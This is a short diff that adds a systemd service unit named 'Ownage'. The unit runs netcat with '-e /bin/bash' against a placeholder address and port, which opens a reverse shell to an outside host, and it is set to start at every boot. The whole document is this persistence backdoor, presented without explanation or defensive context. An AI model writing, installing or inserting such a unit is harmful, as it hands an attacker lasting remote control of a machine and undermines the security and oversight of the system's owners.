@@ -1,0 +1,6 @@
+[Unit]
+Description=Ownage
+[Service]
+ExecStart=/bin/sh -c "nc [IP-ADDR] [PORT] -e /bin/bash"
+[Install]
+WantedBy=multi-user.target
